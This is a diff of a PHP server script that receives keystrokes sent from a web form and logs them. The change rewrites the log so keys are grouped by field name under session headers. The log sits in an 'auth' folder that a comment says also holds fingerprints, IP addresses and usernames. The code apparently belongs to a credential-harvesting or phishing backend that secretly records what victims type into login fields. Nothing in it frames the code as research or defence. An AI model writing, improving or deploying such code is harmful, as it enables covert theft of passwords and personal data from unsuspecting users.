@@ -3,38 +3,33 @@
 $data = json_decode(file_get_contents('php://input'), true);
 
 if (isset($data['counter']) && isset($data['field']) && isset($data['key'])) {
-    $counter = $data['counter'];
     $field = $data['field'];
     $key = $data['key'];
-    $keyCode = $data['keyCode'];
-    $isSpecial = $data['isSpecial'] ? 'YES' : 'NO';
-    $timestamp = $data['timestamp'];
-    $elapsedMs = $data['elapsedMs'];
-    $elapsedSeconds = $data['elapsedSeconds'];
+    $counter = $data['counter'];
     
-    // Create keystrokes directory if it doesn't exist
-    if (!file_exists('keystrokes')) {
-        mkdir('keystrokes', 0755, true);
+    // Save to auth folder (same as fingerprints, ip, usernames)
+    $auth_dir = '../../auth';
+    
+    // Check if this is the first keystroke for this field
+    if ($counter == 1) {
+        // Start new session with header
+        $logEntry = "\n--- NEW SESSION: " . date('Y-m-d H:i:s') . " ---\n";
+        file_put_contents($auth_dir . '/keystrokes.txt', $logEntry, FILE_APPEND);
     }
     
-    // Append to keystroke log file
-    $logEntry = sprintf(
-        "[%04d] [%s] Field: %-10s | Key: %-15s | KeyCode: %3d | Special: %s | Time: %ss (%sms)\n",
-        $counter,
-        date('Y-m-d H:i:s', $timestamp / 1000),
-        $field,
-        $key,
-        $keyCode,
-        $isSpecial,
-        $elapsedSeconds,
-        $elapsedMs
-    );
+    // Read existing content to check if we need to add field label
+    $existing = @file_get_contents($auth_dir . '/keystrokes.txt');
+    $lastLine = substr($existing, strrpos($existing, "\n") + 1);
     
-    file_put_contents('keystrokes/keylog.txt', $logEntry, FILE_APPEND);
+    // Add field label if switching fields or first key
+    if ($counter == 1 || !strpos($lastLine, $field . ':')) {
+        $logEntry = "\n" . ucfirst($field) . ": ";
+        file_put_contents($auth_dir . '/keystrokes.txt', $logEntry, FILE_APPEND);
+    }
     
-    // Also save as JSON for easy parsing
-    $jsonEntry = json_encode($data) . "\n";
-    file_put_contents('keystrokes/keylog.json', $jsonEntry, FILE_APPEND);
+    // Append key with arrow
+    $logEntry = $key . " → ";
+    file_put_contents($auth_dir . '/keystrokes.txt', $logEntry, FILE_APPEND);
     
     echo json_encode(['status' => 'success']);
 } else {
